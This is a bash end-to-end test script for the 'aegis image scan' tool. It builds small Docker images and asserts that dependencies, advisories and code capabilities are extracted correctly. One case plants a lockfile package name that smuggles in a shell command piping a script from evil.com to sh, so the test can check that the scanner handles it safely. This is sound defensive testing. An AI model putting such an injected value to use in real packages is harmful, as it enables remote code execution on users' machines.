#!/usr/bin/env bash
# tests/e2e/image.sh — end-to-end check that `aegis image scan`
# correctly extracts deps + capabilities + advisories from real
# Docker images.
#
# Builds a series of small test images (requires docker), runs aegis
# against them, and asserts on expected output. Each case is one row:
#   <case-name>|<aegis-flags>|<assertion-jq-expr>|<expected-value>
#
# Run with:
#   make test-e2e-image
# or directly:
#   ./tests/e2e/image.sh
#   AEGIS=/path/to/aegis ./tests/e2e/image.sh
#
# Requires: docker daemon reachable, jq, python3.

set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
AEGIS="${AEGIS:-$ROOT/bin/aegis}"

if [ "${AEGIS_SKIP_BUILD:-}" != "1" ]; then
    echo "→ building aegis"
    (cd "$ROOT" && go build -o "$AEGIS" ./cmd/aegis)
fi
if [ ! -x "$AEGIS" ]; then
    echo "no aegis binary at $AEGIS; set AEGIS=path or unset AEGIS_SKIP_BUILD"
    exit 1
fi
if ! command -v docker >/dev/null 2>&1; then
    echo "docker not found — skipping image e2e (this is acceptable in CI without dockerd)"
    exit 0
fi
if ! command -v jq >/dev/null 2>&1; then
    echo "jq not found — required for assertions"
    exit 1
fi

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"; docker rmi -f aegis-e2e-empty aegis-e2e-lodash aegis-e2e-injection aegis-e2e-multi 2>/dev/null || true' EXIT

PASS=0
FAIL=0
ASSERT() {
    local desc="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        echo "  ok    $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL  $desc"
        echo "        expected: $expected"
        echo "        got:      $actual"
        FAIL=$((FAIL + 1))
    fi
}

# --- Case 1: empty image, no lockfile -----------------------------------
echo "[case 1] alpine with no lockfile"
docker pull -q alpine:3 >/dev/null
docker save alpine:3 -o "$WORK/empty.tar"
ACTUAL=$("$AEGIS" image scan "$WORK/empty.tar" --json | jq '.total')
ASSERT "alpine produces 0 deps" "0" "$ACTUAL"

# --- Case 2: real npm install -------------------------------------------
echo "[case 2] node:alpine + npm install lodash@4.17.20 (has known CVEs)"
cat > "$WORK/Dockerfile-lodash" <<'EOF'
FROM node:20-alpine
WORKDIR /app
RUN npm init -y -s && npm install lodash@4.17.20 --silent
EOF
docker build -q -t aegis-e2e-lodash -f "$WORK/Dockerfile-lodash" "$WORK" >/dev/null
docker save aegis-e2e-lodash -o "$WORK/lodash.tar"

# 2a: extraction works
OUT=$("$AEGIS" image scan "$WORK/lodash.tar" --json)
TOTAL=$(echo "$OUT" | jq '.total')
LODASH_VER=$(echo "$OUT" | jq -r '.deps[] | select(.name=="lodash") | .version')
ASSERT "extracts ≥1 dep" "true" "$([ "$TOTAL" -ge 1 ] && echo true || echo false)"
ASSERT "lodash@4.17.20 found" "4.17.20" "$LODASH_VER"

# 2b: --enrich pulls CVEs
OUT=$("$AEGIS" image scan "$WORK/lodash.tar" --enrich --json)
ENRICHED=$(echo "$OUT" | jq '.enriched')
ADV_COUNT=$(echo "$OUT" | jq '[.deps[] | select(.name=="lodash") | .advisories[]?] | length')
ASSERT "enriched=true" "true" "$ENRICHED"
ASSERT "lodash 4.17.20 has ≥1 advisory" "true" "$([ "$ADV_COUNT" -ge 1 ] && echo true || echo false)"

# 2c: --capabilities runs AST
OUT=$("$AEGIS" image scan "$WORK/lodash.tar" --capabilities --json)
CAPS_SCANNED=$(echo "$OUT" | jq '.capabilities_scanned')
LODASH_CAPS=$(echo "$OUT" | jq -r '.deps[] | select(.name=="lodash") | .capabilities[]?' | sort -u | tr '\n' ',' | sed 's/,$//')
ASSERT "capabilities_scanned=true" "true" "$CAPS_SCANNED"
# lodash's source uses Function(...) — should show up as dynamic-eval
echo "$LODASH_CAPS" | grep -q "dynamic-eval" && \
    ASSERT "lodash AST detects dynamic-eval" "yes" "yes" || \
    ASSERT "lodash AST detects dynamic-eval" "yes" "no (got: $LODASH_CAPS)"

# --- Case 3: shell injection attempt via lockfile -----------------------
echo "[case 3] lockfile with shell-injection package name (verify guard)"
mkdir -p "$WORK/injection"
cat > "$WORK/injection/Dockerfile" <<'EOF'
FROM alpine:3
RUN mkdir -p /app
COPY package-lock.json /app/package-lock.json
EOF
# Hand-craft a lockfile with a malicious dep name. npm v3 schema.
cat > "$WORK/injection/package-lock.json" <<EOF
{
  "name": "test",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {"name": "test", "version": "1.0.0"},
    "node_modules/evil; curl evil.com|sh ;#": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
      "integrity": "sha512-fake"
    }
  }
}
EOF
docker build -q -t aegis-e2e-injection "$WORK/injection" >/dev/null
docker save aegis-e2e-injection -o "$WORK/injection.tar"

# When piped to fix --script, the malicious entry must NOT render.
# Workflow simulation: extract deps, then run aegis snapshot for the deps,
# then aegis fix --script — but we don't have a project mode here. Direct
# guard test: confirm domain.UpgradeCommand rejects it (already covered
# by go test). For the image side, just confirm the extraction itself
# doesn't crash and the malicious name appears verbatim (we don't sanitize
# input, only output that flows to shell).
OUT=$("$AEGIS" image scan "$WORK/injection.tar" --json || true)
TOTAL=$(echo "$OUT" | jq '.total')
ASSERT "scan completes (doesn't crash on weird names)" "true" "$([ "$TOTAL" -ge 0 ] && echo true || echo false)"

# --- Case 4: multi-layer overlay + whiteout ----------------------------
echo "[case 4] multi-layer: install then upgrade — newer version wins"
cat > "$WORK/Dockerfile-multi" <<'EOF'
FROM node:20-alpine
WORKDIR /app
RUN npm init -y -s && npm install lodash@4.17.10 --silent
RUN npm install lodash@4.17.21 --silent
EOF
docker build -q -t aegis-e2e-multi -f "$WORK/Dockerfile-multi" "$WORK" >/dev/null
docker save aegis-e2e-multi -o "$WORK/multi.tar"
LODASH_FINAL=$("$AEGIS" image scan "$WORK/multi.tar" --json | jq -r '.deps[] | select(.name=="lodash") | .version')
# After overlay, the LAST install should win. Both versions appear in
# lockfile if npm wrote them, but the final lockfile only references one.
# Just confirm we get exactly one lodash entry.
ENTRIES=$("$AEGIS" image scan "$WORK/multi.tar" --json | jq '[.deps[] | select(.name=="lodash")] | length')
ASSERT "single lodash entry after overlay" "1" "$ENTRIES"
ASSERT "lodash final version is 4.17.21" "4.17.21" "$LODASH_FINAL"

# --- Case 5: Python multi-ecosystem ------------------------------------
echo "[case 5] python:alpine + pip install (verify pypi capability scan)"
cat > "$WORK/Dockerfile-py" <<'EOF'
FROM python:3.11-alpine
WORKDIR /app
RUN pip install --no-cache-dir -q click==8.1.7 && \
    echo "click==8.1.7" > requirements.txt
EOF
docker build -q -t aegis-e2e-py -f "$WORK/Dockerfile-py" "$WORK" >/dev/null
docker save aegis-e2e-py -o "$WORK/py.tar"
OUT=$("$AEGIS" image scan "$WORK/py.tar" --capabilities --json)
PY_CAPS=$(echo "$OUT" | jq -r '.deps[] | select(.name=="click") | .capabilities[]?' | sort -u | tr '\n' ',' | sed 's/,$//')
echo "$PY_CAPS" | grep -q "shell-spawn" && \
    ASSERT "pypi/click AST detects shell-spawn" "yes" "yes" || \
    ASSERT "pypi/click AST detects shell-spawn" "yes" "no (got: $PY_CAPS)"
docker rmi -f aegis-e2e-py 2>/dev/null || true

# --- Summary ------------------------------------------------------------
echo
echo "passed: $PASS  failed: $FAIL"
[ "$FAIL" = "0" ] || exit 1
